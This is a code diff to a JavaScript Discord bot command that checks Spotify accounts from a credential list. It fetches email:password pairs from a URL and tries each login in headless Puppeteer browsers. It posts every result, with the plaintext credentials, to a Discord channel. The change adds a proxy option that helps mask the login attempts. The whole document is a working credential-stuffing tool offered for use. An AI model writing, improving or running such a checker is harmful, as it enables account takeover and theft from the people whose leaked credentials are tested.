@@ -13,11 +13,15 @@ const getCredentials = url => fetch(url).then(res => res.text());
 let error_count = 0;
 let error_message = "";
 
-const checkCredentials = async (
-  { browser, credentials, message, msg },
+const checkCredentials = async ({
+  browser,
+  credentials,
+  message,
+  msg,
   index,
-  maxIndex
-) => {
+  maxIndex,
+  puppeteerParams
+}) => {
   try {
     if (index < (maxIndex || credentials.length)) {
       const email = credentials[index].substring(
@@ -72,22 +76,30 @@ const checkCredentials = async (
         message.channel.send(`${cred_status} -> ${email}:${password}`);
 
         await browser.close();
-        const puppeteerOptions = await getPuppeteerOptions();
+        const puppeteerOptions = await getPuppeteerOptions(puppeteerParams);
         const newBrowser = await puppeteer.launch(puppeteerOptions);
-        checkCredentials(
-          { browser: newBrowser, credentials, message, msg },
-          index + 1,
-          maxIndex
-        );
+        checkCredentials({
+          browser: newBrowser,
+          credentials,
+          message,
+          msg,
+          index: index + 1,
+          maxIndex,
+          puppeteerParams
+        });
       }
 
       if (cred_status === "failed") {
         await page.close();
-        checkCredentials(
-          { browser, credentials, message, msg },
-          index + 1,
-          maxIndex
-        );
+        checkCredentials({
+          browser,
+          credentials,
+          message,
+          msg,
+          index: index + 1,
+          maxIndex,
+          puppeteerParams
+        });
       }
     }
   } catch (err) {
@@ -97,11 +109,15 @@ const checkCredentials = async (
     await browser.close();
     const puppeteerOptions = await getPuppeteerOptions();
     const newBrowser = await puppeteer.launch(puppeteerOptions);
-    checkCredentials(
-      { browser: newBrowser, credentials, message, msg },
-      index + 1,
-      maxIndex
-    );
+    checkCredentials({
+      browser: newBrowser,
+      credentials,
+      message,
+      msg,
+      index: index + 1,
+      maxIndex,
+      puppeteerParams
+    });
   }
 };
 
@@ -110,11 +126,12 @@ module.exports = {
   aliases: ["nc"],
   description: "Check spotify accounts from a list",
   args: true,
-  usage: `http://example.com/file.txt 1 12`,
+  usage: `http://example.com/file.txt no 1 12`,
   devOnly: true,
   async execute(message, args) {
-    const initialIndex = parseInt(args[1], 10) || 0;
-    const maxIndex = parseInt(args[2], 10) || 0;
+    const useProxy = args[1] || "no";
+    const initialIndex = parseInt(args[2], 10) || 0;
+    const maxIndex = parseInt(args[3], 10) || 0;
     const textResult = await getCredentials(args[0]);
     const credentials = textResult
       .split("\n")
@@ -126,20 +143,20 @@ module.exports = {
       })
       .filter(val => !!val);
 
-    const puppeteerOptions = await getPuppeteerOptions();
+    const puppeteerParams = useProxy === "yes" ? URL : "";
+    const puppeteerOptions = await getPuppeteerOptions(puppeteerParams);
     const browser = await puppeteer.launch(puppeteerOptions);
 
     return message.channel.send("Please wait...").then(async msg => {
-      await checkCredentials(
-        {
-          browser,
-          credentials,
-          message,
-          msg
-        },
-        initialIndex,
-        maxIndex
-      );
+      await checkCredentials({
+        browser,
+        credentials,
+        message,
+        msg,
+        index: initialIndex,
+        maxIndex,
+        puppeteerParams
+      });
     });
   }
 };
